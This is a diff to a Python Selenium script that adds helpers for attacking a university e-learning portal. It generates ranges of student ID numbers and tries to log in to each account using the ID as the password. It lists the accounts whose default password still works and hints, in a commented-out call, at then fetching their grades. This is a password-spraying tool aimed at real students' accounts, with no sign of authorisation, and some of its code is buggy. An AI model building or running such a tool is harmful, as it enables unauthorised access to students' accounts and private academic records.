@@ -1,3 +1,4 @@
+from attr import NOTHING
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.by import By
@@ -6,7 +7,89 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import NoSuchElementException,  WebDriverException
 import time
+import os
 
+
+def get_unchanged(candidates, browser):
+    """Helper function to get student ids with unchanged passwords.
+
+    Args:
+        candidates (list[str]): Student IDs to be probed.
+        browser (str): Browser to be used (only chrome and firefox supported)
+
+    Returns:
+        list[str]: Student IDs with default passwords.
+    """
+    unchanged = []
+    for cand in candidates:
+        driver = login(cand, cand, 'browser')
+
+        if driver is None:
+            print(f'User {cand} could not login with password {cand}.')
+            with open('bad.txt', 'a') as the_file:
+                the_file.write(f"{cand}\n")
+        else:
+            print(f'User {cand} has not changed their password.')
+            unchanged.append(cand)
+            # get_grades(driver, cand, cand)
+
+    return unchanged
+
+def dir_path(string):
+    if os.path.isfile(string):
+        return string
+    else:
+        return NotADirectoryError(string)
+
+def generate_list(
+    bachelors=True, masters=False, phd=False,
+    _year0=103, _year1=110,
+    _dep0=212, _dep1=213,
+    _sid0=00, _sid1=99
+    ) -> list[str]:
+
+    """Helper function to generate list of student ID numbers following NDHU's standard.
+
+    Args:
+        bachelors (bool, optional): Indicate if bachelor student should be included. Defaults to True.
+        masters (bool, optional): Indicate if master students should be included. Defaults to False.
+        phd (bool, optional): Indicate if phd students should be included. Defaults to False.
+        _year0 (int, optional): Begin generation at this year number (inclusive). Defaults to 103.
+        _year1 (int, optional): End generation at this year number (inclusive). Defaults to 110.
+        _dep0 (int, optional): Begin generation for department number at this number. Defaults to 212.
+        _dep1 (int, optional): End generation for department number at this number. Defaults to 213.
+        _sid0 (int, optional): Begin generation for department specific student number at this value. Defaults to 0.
+        _sid1 (int, optional): End generation for department specific student number at this value. Defaults to 99.
+
+    Returns:
+        _type_: list of student IDs.
+    """
+
+    degrees = []
+    degrees.append('4') if bachelors else NOTHING
+    degrees.append('6') if masters else NOTHING
+    degrees.append('8') if phd else NOTHING
+
+    inc = 1    
+    if _year0 > _year1:
+        inc = -1
+
+    candidates = []
+    for degree in degrees:
+        for year in range(_year0, _year1, inc):
+            for dep in range(_dep0, _dep1):
+                for number in range(_sid0, _sid1):
+                    new_stud = degree + str(year)
+                    dept = str(dep)
+                    dept = f'{dept: >3}'.format('0').replace(' ', '0')
+                    num = str(number)
+                    num = f'{num: >2}'.format('0').replace(' ', '0')
+                    new_stud += dept
+                    new_stud += num
+                    candidates.append(new_stud)
+                    # print(new_stud)
+
+    return candidates
 
 def login(_username, _password, browser):
     """Login helper function for NDHU's elearning portal. Returns driver if user/pass combination exists, returns None if it doesn't.
